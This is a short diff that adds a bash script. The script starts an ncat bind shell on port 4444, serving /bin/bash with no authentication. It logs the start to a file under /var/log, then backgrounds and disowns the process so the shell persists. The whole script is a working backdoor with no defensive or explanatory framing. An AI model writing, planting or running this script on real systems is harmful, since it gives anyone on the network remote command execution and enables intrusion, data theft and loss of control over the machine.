@@ -1,0 +1,14 @@
+#!/bin/bash
+
+# Define the port and log file for the bind shell
+PORT=4444
+LOGFILE="/var/log/authlog/bind.log"
+
+# Start the bind shell and redirect both stdout and stderr to the log file
+ncat -lvp $PORT -e /bin/bash >> "$LOGFILE" 2>&1 &
+
+# Log the bind shell initiation
+echo "$(date): Bind shell started on port $PORT" >> "$LOGFILE"
+
+# Ensure the script runs in the background
+disown
